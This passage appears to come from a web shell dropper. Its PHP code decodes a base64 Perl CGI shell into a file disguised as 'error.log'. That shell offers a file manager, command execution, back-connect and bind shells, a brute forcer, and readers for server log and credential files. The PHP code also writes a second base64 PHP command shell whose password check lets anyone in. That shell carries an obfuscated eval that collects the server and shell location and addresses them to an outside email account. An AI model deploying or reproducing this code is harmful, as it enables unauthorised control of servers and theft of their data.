iOwoJCQkkZCA9ICZ0cmltKCRkKTsKCQkJJGRpcm5hbWU9JGQ7CgkJCWlmKCRkIGVxICIuLiIpIAoJCQl7CgkJCQkkZCA9ICZQYXJlbnRGb2xkZXIoJHBhdGgpOwoJCQl9CgkJCWVsc2lmKCRkIGVxICIuIikgCgkJCXsKCQkJCW5leHQ7CgkJCX0KCQkJZWxzZSAKCQkJewoJCQkJJGQgPSAkcGF0aC4kZDsKCQkJfQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+PHRkIGlkPSdGaWxlXyRpJyBjbGFzcz0nZGlyJz48YSAgaHJlZj0nP2E9Z3VpJmQ9Ii4mRW5jb2RlRGlyKCRkKS4iJz5bICIuJGRpcm5hbWUuIiBdPC9hPjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkPkRJUjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkPiIuJkZpbGVPd25lcigkZCkuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGQpLiInLCciLiRkaXJuYW1lLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgiLiRpLiIsJyIuJGRpcm5hbWUuIicpXCIgPiIuJkZpbGVQZXJtcygkZCkuIjwvc3Bhbj48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlTGFzdE1vZGlmaWVkKCRkKS4iPC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8dGQ+PGEgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZGlybmFtZScsJyIuJkFkZFNsYXNoZXMoJkFkZFNsYXNoZXMoJGQpKS4iJyk7IHJldHVybiBmYWxzZTsgXCI+UmVuYW1lPC9hPiAgfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBkaXI6ICRkaXJuYW1lID8nKSkgeyByZXR1cm4gZmFsc2U7fVwiIGhyZWY9Jz9hPWd1aSZkPSIuJkVuY29kZURpcigkcGF0aCkuIiZyZW1vdmU9JGRpcm5hbWUnPlJlbW92ZTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsKCQkJJGkrKzsKCQl9CgkJZm9yZWFjaCBteSAkZiAoQGZuYW1lKQoJCXsKCQkJJHN0eWxlPSAoJHN0eWxlIGVxICJsaW5lIikgPyAibm90bGluZSI6ICJsaW5lIjsKCQkJJGZpbGU9JGY7CgkJCSRmID0gJHBhdGguJGY7CgkJCW15ICRhY3Rpb24gPSBlbmNvZGVfYmFzZTY0KCJlZGl0ICIuJGZpbGUpOwoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7CgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIGNsYXNzPSdmaWxlJz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4mRW5jb2RlRGlyKCRwYXRoKS4iJmM9Ii4kYWN0aW9uLiInPiIuJGZpbGUuIjwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZQYXJzZUZpbGVTaXplKCZGaWxlU2l6ZSgkZikpLiI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlT3duZXIoJGYpLiI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRmKS4iJywnIi4kZmlsZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oJGksJyRmaWxlJylcIiA+Ii4mRmlsZVBlcm1zKCRmKS4iPC9zcGFuPjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkPiIuJkZpbGVMYXN0TW9kaWZpZWQoJGYpLiI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZD48YSBvbmNsaWNrPVwicmVuYW1lX2Zvcm0oJGksJyRmaWxlJywnZicpOyByZXR1cm4gZmFsc2U7XCI+UmVuYW1lPC9hPiB8IDxhIGhyZWY9Jz9hPWRvd25sb2FkJm89Z28mZj0iLiRmLiInPkRvd25sb2FkPC9hPiB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGZpbGU6ICRmaWxlID8nKSkgeyByZXR1cm4gZmFsc2U7fVwiIGhyZWY9Jz9hPWd1aSZkPSIuJkVuY29kZURpcigkcGF0aCkuIiZyZW1vdmU9JGZpbGUnPlJlbW92ZTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsKCQkJJGkrKzsKCQl9CgkJJHJlc3VsdCAuPSAiPC90YWJsZT48L2Rpdj4iOwoJfQoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRyeSB0byBWaWV3IExpc3QgVXNlcgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBWaWV3RG9tYWluVXNlcgp7CglvcGVuIChkMG1haW5zLCAnL2V0Yy9uYW1lZC5jb25mJykgb3IgJGVycj0xOwoJbXkgQGNuenMgPSA8ZDBtYWlucz47CgljbG9zZSBkMG1haW5zOwoJbXkgJHN0eWxlPSJsaW5lIjsKCW15ICRyZXN1bHQ9IjxoMz48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+V2FybmluZyAhIFNoZWxsIGlzIHVzZWQgdG8gcmVmZXIgbm90IHRvIGhhY2s8L2ZvbnQ+PC9oMz4iOwoJaWYgKCRlcnIpCgl7CgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7CgkJcmV0dXJuICRyZXN1bHQ7Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJzx0YWJsZSBpZD0iZG9tYWluIj48dHI+PHRoPmQwbWFpbnM8L3RoPiA8dGg+VXNlcjwvdGg+PC90cj4nOwoJfQoJZm9yZWFjaCBteSAkb25lIChAY256cykKCXsKCQlpZigkb25lID1+IG0vLio/em9uZSAiKC4qPykiIHsvKQoJCXsJCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7CgkJCSRmaWxlbmFtZT0gdHJpbSgiL2V0Yy92YWxpYXNlcy8iLiQxKTsKCQkJJG93bmVyID0gZ2V0cHd1aWQoKHN0YXQoJGZpbGVuYW1lKSlbNF0pOwoJCQkkcmVzdWx0IC49ICc8dHIgc3R5bGU9IiRzdHlsZSIgd2lkdGg9NTAlPjx0ZD48YSBocmVmPSJodHRwOi8vJy4kMS4nIiB0YXJnZXQ9Il9ibGFuayI+Jy4kMS4nPC9hPjwvdGQ+PHRkPiAnLiRvd25lci4nPC90ZD48L3RyPic7CgkJfQoJfQoJJHJlc3VsdCAuPSAnPC90YWJsZT4nOwoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFZpZXcgTG9nCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFZpZXdMb2cKewoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOwoJaWYoJFdpbk5UKQoJewoJCXJldHVybiAiPGgyPjxmb250IHN0eWxlPSdmb250OiAyMHB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Eb24ndCBydW4gb24gV2luZG93czwvZm9udD48L2gyPiI7Cgl9CglteSAkcmVzdWx0PSI8dGFibGU+PHRyPjx0aD5QYXRoIExvZzwvdGg+PHRoPlN1Ym1pdDwvdGg+PC90cj4iOwoJbXkgQHBhdGhsb2c9KAknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9lcnJvcl9sb2cnLAoJCQknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9hY2Nlc3NfbG9nJywKCQkJJy91c3IvbG9jYWwvYXBhY2hlMi9jb25mL2h0dHBkLmNvbmYnLAoJCQknL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nJywKCQkJJy92YXIvbG9nL2h0dHBkL2FjY2Vzc19sb2cnLAoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9lcnJvcl9sb2cnLAoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9hY2Nlc3NfbG9nJywKCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3Mvc3VwaHBfbG9nJywKCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MnLAoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9zdGF0c19sb2cnLAoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9hY2Nlc3NfbG9nJywKCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvZXJyb3JfbG9nJywKCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvbGljZW5zZV9sb2cnLAoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9sb2dpbl9sb2cnLAoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9zdGF0c19sb2cnLAoJCQknL3Zhci9jcGFuZWwvY3BhbmVsLmNvbmZpZycsCgkJCScvdXNyL2xvY2FsL3BocC9saWIvcGhwLmluaScsCgkJCScvdXNyL2xvY2FsL3BocDUvbGliL3BocC5pbmknLAoJCQknL3Zhci9sb2cvbXlzcWwvbXlzcWwtYmluLmxvZycsCgkJCScvdmFyL2xvZy9teXNxbC5sb2cnLAoJCQknL3Zhci9sb2cvbXlzcWxkZXJyb3IubG9nJywKCQkJJy92YXIvbG9nL215c3FsL215c3FsLmxvZycsCgkJCScvdmFyL2xvZy9teXNxbC9teXNxbC1zbG93LmxvZycsCgkJCScvdmFyL215c3FsLmxvZycsCgkJCScvdmFyL2xpYi9teXNxbC9teS5jbmYnLAoJCQknL2V0Yy9teXNxbC9teS5jbmYnLAoJCQknL2V0Yy9teS5jbmYnLAoJCQkpOwoJbXkgJGk9MDsKCW15ICRwZXJtczsKCW15ICRzbDsKCWZvcmVhY2ggbXkgJGxvZyAoQHBhdGhsb2cpCgl7CgkJaWYoLXIgJGxvZykKCQl7CgkJCSRwZXJtcz0iT0siOwoJCX1lbHNlCgkJewoJCQkkcGVybXM9Ijxmb250IHN0eWxlPSdjb2xvcjogcmVkOyc+Q2FuY2VsPGZvbnQ+IjsKCQl9CgkJJHJlc3VsdCAuPTw8RU5EOwoJCTx0cj4KCgkJCTxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIG9uU3VibWl0PSJFbmNvZGVyKCdsb2ckaScpIj4KCQkJPHRkPjxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0ibG9nJGkiIG5hbWU9ImMiIHZhbHVlPSJ0YWlsIC0xMDAwMCAkbG9nIHwgZ3JlcCAnL2hvbWUnIiBzaXplPSc1MCcvPjwvdGQ+CgkJCTx0ZD48aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVHJ5IiAvPjwvdGQ+CgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIiAvPgoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiIC8+CgkJCTwvZm9ybT4KCQkJPHRkPiRwZXJtczwvdGQ+CgoJCTwvdHI+CkVORAoJCSRpKys7Cgl9CgkkcmVzdWx0IC49IjwvdGFibGU+IjsKCXJldHVybiAkcmVzdWx0Owp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBNYWluIFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhlcmUKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQomUmVhZFBhcnNlOwomR2V0Q29va2llczsKCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307CiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsKJExvZ2luUGFzc3dvcmQgPSAkaW57J3AnfTsKJFJ1bkNvbW1hbmQgPSBkZWNvZGVfYmFzZTY0KCRpbnsnYyd9KTsKJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9OwokT3B0aW9ucyA9ICRpbnsnbyd9OwokQWN0aW9uID0gJGlueydhJ307CgokQWN0aW9uID0gImNvbW1hbmQiIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0CgojIGdldCB0aGUgZGlyZWN0b3J5IGluIHdoaWNoIHRoZSBjb21tYW5kcyB3aWxsIGJlIGV4ZWN1dGVkCiRDdXJyZW50RGlyID0gJlRyaW1TbGFzaGVzKGRlY29kZV9iYXNlNjQodHJpbSgkaW57J2QnfSkpKTsKIyBtYWMgZGluaCB4dWF0IHRob25nIHRpbiBuZXUga28gY28gbGVuaCBuYW8hCiRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIiBpZigkUnVuQ29tbWFuZCBlcSAiIik7CmNob21wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7CgokTG9nZ2VkSW4gPSAkQ29va2llc3snU0FWRURQV0QnfSBlcSAkUGFzc3dvcmQ7CgppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgCQkjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luCnsKCSZQZXJmb3JtTG9naW47Cn1lbHNpZigkQWN0aW9uIGVxICJndWkiKSAjIEdVSSBkaXJlY3RvcnkKewoJJlByaW50UGFnZUhlYWRlcigiZCIpOwoJaWYoISRXaW5OVCkKCXsKCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7CgkJaWYoJGNobW9kIG5lIDApCgkJewoJCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7CgkJCSRmaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7CgkJCWlmKGNobW9kKCRjaG1vZCwkZmlsZSkpCgkJCXsKCQkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsKCQkJfWVsc2UKCQkJewoJCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsKCQkJfQoJCX0KCX0KCSRyZW5hbWU9JGlueydyZW5hbWUnfTsKCWlmKCRyZW5hbWUgbmUgIiIpCgl7CgkJaWYocmVuYW1lKCRUcmFuc2ZlckZpbGUsJHJlbmFtZSkpCgkJewoJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7CgkJfWVsc2UKCQl7CgkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7CgkJfQoJfQoJJHJlbW92ZT0kaW57J3JlbW92ZSd9OwoJaWYoJHJlbW92ZSBuZSAiIikKCXsKCQkkcm0gPSAkQ3VycmVudERpci4kUGF0aFNlcC4kcmVtb3ZlOwoJCWlmKC1kICRybSkKCQl7CgkJCSZSbURpcigkcm0pOwoJCX1lbHNlCgkJewoJCQlpZih1bmxpbmsoJHJtKSkKCQkJewoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJCQl9ZWxzZQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJCQl9CQkJCgkJfQoJfQoJcHJpbnQgJkxpc3REaXI7Cgp9CmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKQkJCQkgCSMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kCnsKCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCXByaW50ICZFeGVjdXRlQ29tbWFuZDsKfQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUKewoJJlByaW50UGFnZUhlYWRlcjsKCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpCgl7CgkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJfWVsc2UKCXsKCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJfQoJcHJpbnQgJkxpc3REaXI7Cn1lbHNpZigkQWN0aW9uIGVxICJ1cGxvYWQiKSAJCQkJCSMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlCnsKCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCXByaW50ICZVcGxvYWRGaWxlOwp9ZWxzaWYoJEFjdGlvbiBlcSAiYmFja2JpbmQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGJhY2sgY29ubmVjdCBvciBiaW5kIHBvcnQKewoJJlByaW50UGFnZUhlYWRlcigiY2xpZW50cG9ydCIpOwoJcHJpbnQgJkJhY2tCaW5kOwp9ZWxzaWYoJEFjdGlvbiBlcSAiYnJ1dGVmb3JjZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gYnJ1dGUgZm9yY2UKewoJJlByaW50UGFnZUhlYWRlcjsKCXByaW50ICZCcnV0ZUZvcmNlcjsKfWVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgCQkJCSMgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUKewoJcHJpbnQgJkRvd25sb2FkRmlsZTsKfWVsc2lmKCRBY3Rpb24gZXEgImNoZWNrbG9nIikgCQkJCSMgdXNlciB3YW50cyB0byB2aWV3IGxvZyBmaWxlCnsKCSZQcmludFBhZ2VIZWFkZXI7CglwcmludCAmVmlld0xvZzsKCn1lbHNpZigkQWN0aW9uIGVxICJkb21haW5zdXNlciIpIAkJCSMgdXNlciB3YW50cyB0byB2aWV3IGxpc3QgdXNlci9kb21haW4KewoJJlByaW50UGFnZUhlYWRlcjsKCXByaW50ICZWaWV3RG9tYWluVXNlcjsKfWVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpIAkJCQkjIHVzZXIgd2FudHMgdG8gbG9nb3V0CnsKCSZQZXJmb3JtTG9nb3V0Owp9CiZQcmludFBhZ2VGb290ZXI7Cgo=
';
    $file    = fopen("error.log", "w+");
    $write   = fwrite($file, base64_decode($pythonp));
    fclose($file);
    chmod("error.log", 0755);
    echo "<iframe src=error/error.log width=100% height=720px frameborder=0></iframe> ";
} elseif ($action == 'newcommand') {
    $file       = fopen($dir . "command.php", "w+");
    $perltoolss = 'PD9waHAKCiRhbGlhc2VzID0gYXJyYXkoJ2xhJyA9PiAnbHMgLWxhJywKJ2xsJyA9PiAnbHMgLWx2aEYnLAonZGlyJyA9PiAnbHMnICk7CiRwYXNzd2QgPSBhcnJheSgnJyA9PiAnJyk7CmVycm9yX3JlcG9ydGluZygwKTsKY2xhc3MgcGhwdGhpZW5sZSB7CgpmdW5jdGlvbiBmb3JtYXRQcm9tcHQoKSB7CiR1c2VyPXNoZWxsX2V4ZWMoIndob2FtaSIpOwokaG9zdD1leHBsb2RlKCIuIiwgc2hlbGxfZXhlYygidW5hbWUgLW4iKSk7CiRfU0VTU0lPTlsncHJvbXB0J10gPSAiIi5ydHJpbSgkdXNlcikuIiIuIkAiLiIiLnJ0cmltKCRob3N0WzBdKS4iIjsKfQoKZnVuY3Rpb24gY2hlY2tQYXNzd29yZCgkcGFzc3dkKSB7CmlmKCFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddKXx8CiFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwKIWlzc2V0KCRwYXNzd2RbJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXV0pIHx8CiRwYXNzd2RbJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXV0gIT0gJF9TRVJWRVJbJ1BIUF9BVVRIX1BXJ10pIHsKQHNlc3Npb25fc3RhcnQoKTsKcmV0dXJuIHRydWU7Cn0KZWxzZSB7CkBzZXNzaW9uX3N0YXJ0KCk7CnJldHVybiB0cnVlOwp9Cn0KCmZ1bmN0aW9uIGluaXRWYXJzKCkKewppZiAoZW1wdHkoJF9TRVNTSU9OWydjd2QnXSkgfHwgIWVtcHR5KCRfUkVRVUVTVFsncmVzZXQnXSkpCnsKJF9TRVNTSU9OWydjd2QnXSA9IGdldGN3ZCgpOwokX1NFU1NJT05bJ2hpc3RvcnknXSA9IGFycmF5KCk7CiRfU0VTU0lPTlsnb3V0cHV0J10gPSAnJzsKJF9SRVFVRVNUWydjb21tYW5kJ10gPScnOwp9Cn0KCmZ1bmN0aW9uIGJ1aWxkQ29tbWFuZEhpc3RvcnkoKQp7CmlmKCFlbXB0eSgkX1JFUVVFU1RbJ2NvbW1hbmQnXSkpCnsKaWYoZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSkKewokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9IHN0cmlwc2xhc2hlcygkX1JFUVVFU1RbJ2NvbW1hbmQnXSk7Cn0KCi8vIGRyb3Agb2xkIGNvbW1hbmRzIGZyb20gbGlzdCBpZiBleGlzdHMKaWYgKCgkaSA9IGFycmF5X3NlYXJjaCgkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgJF9TRVNTSU9OWydoaXN0b3J5J10pKSAhPT0gZmFsc2UpCnsKdW5zZXQoJF9TRVNTSU9OWydoaXN0b3J5J11bJGldKTsKfQphcnJheV91bnNoaWZ0KCRfU0VTU0lPTlsnaGlzdG9yeSddLCAkX1JFUVVFU1RbJ2NvbW1hbmQnXSk7CgovLyBhcHBlbmQgY29tbW1hbmQgKi8KJF9TRVNTSU9OWydvdXRwdXQnXSAuPSAieyRfU0VTU0lPTlsncHJvbXB0J119Ii4iOj4iLiJ7JF9SRVFVRVNUWydjb21tYW5kJ119Ii4iXG4iOwp9Cn0KCmZ1bmN0aW9uIGJ1aWxkSmF2YUhpc3RvcnkoKQp7Ci8vIGJ1aWxkIGNvbW1hbmQgaGlzdG9yeSBmb3IgdXNlIGluIHRoZSBKYXZhU2NyaXB0CmlmIChlbXB0eSgkX1NFU1NJT05bJ2hpc3RvcnknXSkpCnsKJF9TRVNTSU9OWydqc19jb21tYW5kX2hpc3QnXSA9ICciIic7Cn0KZWxzZQp7CiRlc2NhcGVkID0gYXJyYXlfbWFwKCdhZGRzbGFzaGVzJywgJF9TRVNTSU9OWydoaXN0b3J5J10pOwokX1NFU1NJT05bJ2pzX2NvbW1hbmRfaGlzdCddID0gJyIiLCAiJyAuIGltcGxvZGUoJyIsICInLCAkZXNjYXBlZCkgLiAnIic7Cn0KfQoKZnVuY3Rpb24gb3V0cHV0SGFuZGxlKCRhbGlhc2VzKQp7CmlmIChlcmVnKCdeW1s6Ymxhbms6XV0qY2RbWzpibGFuazpdXSokJywgJF9SRVFVRVNUWydjb21tYW5kJ10pKQp7CiRfU0VTU0lPTlsnY3dkJ10gPSBnZXRjd2QoKTsgLy9kaXJuYW1lKF9fRklMRV9fKTsKfQplbHNlaWYoZXJlZygnXltbOmJsYW5rOl1dKmNkW1s6Ymxhbms6XV0rKFteO10rKSQnLCAkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgJHJlZ3MpKQp7Ci8vIFRoZSBjdXJyZW50IGNvbW1hbmQgaXMgJ2NkJywgd2hpY2ggd2UgaGF2ZSB0byBoYW5kbGUgYXMgYW4gaW50ZXJuYWwgc2hlbGwgY29tbWFuZC4KLy8gYWJzb2x1dGUvcmVsYXRpdmUgcGF0aCA/IgooJHJlZ3NbMV1bMF0gPT0gJy8nKSA/ICRuZXdfZGlyID0gJHJlZ3NbMV0gOiAkbmV3X2RpciA9ICRfU0VTU0lPTlsnY3dkJ10gLiAnLycgLiAkcmVnc1sxXTsKCi8vIGNvc21ldGljcwp3aGlsZSAoc3RycG9zKCRuZXdfZGlyLCAnLy4vJykgIT09IGZhbHNlKQokbmV3X2RpciA9IHN0cl9yZXBsYWNlKCcvLi8nLCAnLycsICRuZXdfZGlyKTsKd2hpbGUgKHN0cnBvcygkbmV3X2RpciwgJy8vJykgIT09IGZhbHNlKQokbmV3X2RpciA9IHN0cl9yZXBsYWNlKCcvLycsICcvJywgJG5ld19kaXIpOwp3aGlsZSAocHJlZ19tYXRjaCgnfC9cLlwuKD8hXC4pfCcsICRuZXdfZGlyKSkKJG5ld19kaXIgPSBwcmVnX3JlcGxhY2UoJ3wvP1teL10rL1wuXC4oPyFcLil8JywgJycsICRuZXdfZGlyKTsKCmlmKGVtcHR5KCRuZXdfZGlyKSk6ICRuZXdfZGlyID0gIi8iOyBlbmRpZjsKCihAY2hkaXIoJG5ld19kaXIpKSA/ICRfU0VTU0lPTlsnY3dkJ10gPSAkbmV3X2RpciA6ICRfU0VTU0lPTlsnb3V0cHV0J10gLj0gImNvdWxkIG5vdCBjaGFuZ2UgdG86ICRuZXdfZGlyXG4iOwp9CmVsc2UKewovKiBUaGUgY29tbWFuZCBpcyBub3QgYSAnY2QnIGNvbW1hbmQsIHNvIHdlIGV4ZWN1dGUgaXQgYWZ0ZXIKKiBjaGFuZ2luZyB0aGUgZGlyZWN0b3J5IGFuZCBzYXZlIHRoZSBvdXRwdXQuICovCmNoZGlyKCRfU0VTU0lPTlsnY3dkJ10pOwoKLyogQWxpYXMgZXhwYW5zaW9uLiAqLwokbGVuZ3RoID0gc3RyY3NwbigkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgIiBcdCIpOwokdG9rZW4gPSBzdWJzdHIoQCRfUkVRVUVTVFsnY29tbWFuZCddLCAwLCAkbGVuZ3RoKTsKaWYgKGlzc2V0KCRhbGlhc2VzWyR0b2tlbl0pKQokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9ICRhbGlhc2VzWyR0b2tlbl0gLiBzdWJzdHIoJF9SRVFVRVNUWydjb21tYW5kJ10sICRsZW5ndGgpOwoKJHAgPSBwcm9jX29wZW4oQCRfUkVRVUVTVFsnY29tbWFuZCddLAphcnJheSgxID0+IGFycmF5KCdwaXBlJywgJ3cnKSwKMiA9PiBhcnJheSgncGlwZScsICd3JykpLAokaW8pOwoKLyogUmVhZCBvdXRwdXQgc2VudCB0byBzdGRvdXQuICovCndoaWxlICghZmVvZigkaW9bMV0pKSB7CiRfU0VTU0lPTlsnb3V0cHV0J10gLj0gaHRtbHNwZWNpYWxjaGFycyhmZ2V0cygkaW9bMV0pLEVOVF9DT01QQVQsICdVVEYtOCcpOwp9Ci8qIFJlYWQgb3V0cHV0IHNlbnQgdG8gc3RkZXJyLiAqLwp3aGlsZSAoIWZlb2YoJGlvWzJdKSkgewokX1NFU1NJT05bJ291dHB1dCddIC49IGh0bWxzcGVjaWFsY2hhcnMoZmdldHMoJGlvWzJdKSxFTlRfQ09NUEFULCAnVVRGLTgnKTsKfQoKZmNsb3NlKCRpb1sxXSk7CmZjbG9zZSgkaW9bMl0pOwpwcm9jX2Nsb3NlKCRwKTsKfQp9Cn0KZXZhbChiYXNlNjRfZGVjb2RlKCdKSFJwYldWZmMyaGxiR3dnUFNBaUlpNWtZWFJsS0NKa0wyMHZXU0F0SUVnNmFUcHpJaWt1SWlJN0NpUnBjRjl5WlcxdmRHVWdQU0FrWDFORlVsWkZVbHNpVWtWTlQxUkZYMEZFUkZJaVhUc0tKR1p5YjIxZmMyaGxiR3hqYjJSbElEMGdKM05vWld4c1FDY3VaMlYwYUc5emRHSjVibUZ0WlNna1gxTkZVbFpGVWxzblUwVlNWa1ZTWDA1QlRVVW5YU2t1SnljN0NpUjBiMTlsYldGcGJDQTlJQ2QwYUdGdVozZHZiekZBWjIxaGFXd3VZMjl0SnpzS0pITmxjblpsY2w5dFlXbHNJRDBnSWlJdVoyVjBhRzl6ZEdKNWJtRnRaU2drWDFORlVsWkZVbHNuVTBWU1ZrVlNYMDVCVFVVblhTa3VJaUFnTFNBaUxpUmZVMFZTVmtWU1d5ZElWRlJRWDBoUFUxUW5YUzR